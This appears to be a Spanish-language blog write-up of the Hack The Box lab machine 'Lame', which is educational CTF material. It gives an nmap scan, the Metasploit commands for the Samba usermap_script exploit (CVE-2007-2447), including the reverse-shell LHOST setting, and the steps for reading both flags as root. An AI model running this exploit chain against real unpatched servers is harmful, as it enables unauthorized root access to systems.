---
layout: post
title: "Lame" 
date: 2025-11-30 18:30:00 -0300
categories: [WRITEUPS,Lame]
tags: [HTB, Lame]
---
Writeup lame


💀 Lame: Informe Completo del Laboratorio (HTB)Máquina: Lame (Fácil)Plataforma: Hack The Box (HTB)Objetivo: Obtener la bandera de usuario (user.txt) y la bandera de root (root.txt).1. 🔍 Reconocimiento y Escaneo (Nmap)El primer paso es identificar los servicios y puertos abiertos en la máquina objetivo.Comando:Bashnmap -sC -sV -p- 10.10.10.3
Resultado Clave del Escaneo:PuertoEstadoServicioVersión21/tcpabiertoftpvsftpd 2.3.422/tcpabiertosshOpenSSH 4.7p1139/tcpabiertonetbios-ssnSamba smbd 3.0.20445/tcpabiertonetbios-ssnSamba smbd 3.0.20Análisis Inicial: Los servicios FTP (vsftpd 2.3.4) y Samba (smbd 3.0.20) son versiones muy antiguas, lo que sugiere vulnerabilidades conocidas y de fácil explotación.2. 💥 Explotación Inicial (Obtener Acceso de Usuario)Nos enfocaremos en el servicio de Samba, ya que la versión 3.0.20 es famosa por la vulnerabilidad usermap_script (CVE-2007-2447), que permite la ejecución remota de comandos.2.1. Uso de Metasploit para SambaUtilizaremos Metasploit Framework para explotar esta vulnerabilidad de forma sencilla y obtener una shell (Meterpreter).Iniciar Metasploit:Bashmsfconsole
Cargar el Módulo:Bashuse exploit/multi/samba/usermap_script
Configurar Opciones:Bashset RHOSTS 10.10.10.3
set LHOST [Tu IP de Kali] # Por ejemplo: 10.10.14.X
show options
Ejecutar el Exploit:Bashexploit
2.2. Obtención de la ShellTras la ejecución, se obtendrá una sesión de Meterpreter. Para pasar a una shell estándar de Linux:Bashshell
Ahora estamos dentro de la máquina como el usuario root debido a la naturaleza de la vulnerabilidad de Samba.3. 🚩 Captura de las BanderasDado que el exploit de Samba nos concedió acceso directamente como el usuario root, la escalada de privilegios no es necesaria en esta máquina.3.1. Obtener la Bandera de Usuario (user.txt)El archivo de usuario generalmente se encuentra en el directorio /home/[usuario].Buscar el archivo:Bashfind / -name user.txt 2>/dev/null
Resultado: Se encuentra en /home/makis/user.txtLeer la bandera de usuario:Bashcat /home/makis/user.txt
3.2. Obtener la Bandera de Root (root.txt)El archivo de root se encuentra en el directorio /root/.Cambiar al directorio root:Bashcd /root
Leer la bandera de root:Bashcat root.txt
✅ ConclusiónLame es una máquina de nivel fácil que ilustra la importancia de mantener los servicios y sus versiones actualizados. La explotación directa de la vulnerabilidad usermap_script en Samba (3.0.20) permitió la ejecución de comandos como el usuario root, facilitando la captura de ambas banderas sin un proceso de escalada de privilegios adicional
